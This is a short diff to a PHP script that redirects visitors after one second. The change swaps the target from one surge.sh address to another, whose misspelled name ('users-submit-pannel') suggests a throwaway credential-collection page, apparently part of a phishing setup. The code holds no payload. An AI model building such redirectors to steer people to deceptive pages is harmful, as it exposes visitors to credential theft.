@@ -1,5 +1,5 @@
 <?php
-$url = "https://users-panel-here.surge.sh/";
+$url = "https://users-submit-pannel.surge.sh/";
 header("refresh:1;url=$url");
 exit;
 ?>
